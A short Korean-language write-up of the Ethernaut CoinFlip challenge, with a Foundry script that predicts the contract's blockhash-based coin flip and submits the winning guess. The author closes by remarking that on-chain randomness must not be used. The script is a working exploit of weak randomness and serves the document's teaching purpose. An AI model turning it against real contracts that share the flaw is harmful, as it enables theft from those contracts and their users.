---
tags:
  - Ethernaut
  - Write-up
---
Random인 척 하는 값을 이용한다고도 볼 수 있고.. Random을 구현하기 힘듦을 나타내는 것이라고도 할 수 있고.. 아무튼 그런 문제입니다.

![[Pasted image 20241004045902.png]]

초 심플한 문제입니다. `flip()` 함수 하나만 있는데, 플레이어가 할 일은 `_guess` 값을 제대로 넣는 것 밖에 없습니다.
솔직히 script 짜기 귀찮지만, 연습삼아 해보기로 했습니다.

아래 문서 등을 참고하며 짰습니다.
- [Foundry, getBlockNumber](https://book.getfoundry.sh/cheatcodes/get-block-number)


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {CoinFlip} from "../src/EN_3_CoinFlip.sol";

contract EN_3 is Script {
    CoinFlip public ctrt = CoinFlip(payable(0x06B1D212B8da92b83AF328De5eef4E211Da02097));


    function run() public {
        uint FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        vm.startBroadcast(vm.envUint("PRIV_KEY"));
        uint blockValue = uint(blockhash(vm.getBlockNumber() - 1));
        console.log(vm.getBlockNumber());
        console.log(block.number);

        uint coinflip = blockValue / FACTOR;
        bool guess = coinflip == 1 ? true : false;
        ctrt.flip(guess);

        console.log("Win count:", ctrt.consecutiveWins());
        vm.stopBroadcast();
    }
}
```

문제의 로직을 그대로 들고와서 똑같이 계산해주면 되는 문제입니다.
on-chain data를 기반으로 random value를 생성하는건 하면 안되는 문제입니다.

---

## 여담
10번 반복해야 하는 문제라서, `for` 를 넣으면 쉽게 해결되지 않을까 생각했는데, 스크립트 실행 한 번이 Tx 한 번을 날리는 것 같습니다. (같은 block.number를 계속 사용합니다)
